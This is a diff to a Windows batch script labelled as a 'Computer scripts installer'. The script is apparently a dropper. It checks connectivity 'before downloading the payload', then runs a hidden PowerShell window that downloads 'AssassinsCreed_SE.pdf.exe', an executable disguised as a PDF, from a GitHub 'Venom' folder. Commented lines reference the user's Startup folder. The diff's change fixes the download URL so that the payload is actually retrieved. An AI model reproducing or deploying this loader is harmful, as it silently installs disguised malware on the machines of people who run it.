@@ -1,7 +1,7 @@
 @echo off
 
 @rem Computer scripts installer
-@rem sssset "$currentDir = C:/Users/%USERNAME%/Desktop"
+@rem ssssset "$currentDir = C:/Users/%USERNAME%/Desktop"
 @rem set "$startup = C:/Users/%USERNAME%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
 
 @rem Function to check internet connection
@@ -40,7 +40,7 @@ for %%d in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
 Check internet connectivity before downloading the payload
 call :check_internet
 
-powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://github.com/P0k3m0n-unleashed/ProjSucc/blob/master/Venom/AssassinsCreed_SE.pdf.exe -OutFile AssassinsCreed_SE.pdf.exe"
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://github.com/P0k3m0n-unleashed/ProjSucc/raw/de5323fee7f3ea849f8504aed1d3593af243e64d/Venom/AssassinsCreed_SE.pdf.exe -OutFile AssassinsCreed_SE.pdf.exe"
 
 @rem copy $startup/AssassinsCreed_SE.pdf.exe $currentDir/AssassinsCreed_SE.pdf.exe
 
